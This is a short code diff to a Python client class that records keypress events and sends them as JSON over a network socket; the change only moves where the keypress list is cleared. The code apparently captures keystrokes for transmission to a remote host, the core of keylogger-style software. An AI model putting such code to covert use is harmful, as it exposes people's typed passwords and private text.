@@ -183,12 +183,12 @@ class Client:
             self.buffer[self.index] = str(self.keypresses)
             self.index = 0
         if self.buffer[0] == self.buffer[1]:
+            self.keypresses.clear()
             return
         print(self.keypresses)
         if len(self.keypresses) > 0:
             json_data = json.dumps(self.keypresses)
             self.s.sendall(json_data.encode())
-        self.keypresses.clear()
 
     # Add keypress data to the buffer
     def on_press(self, event):
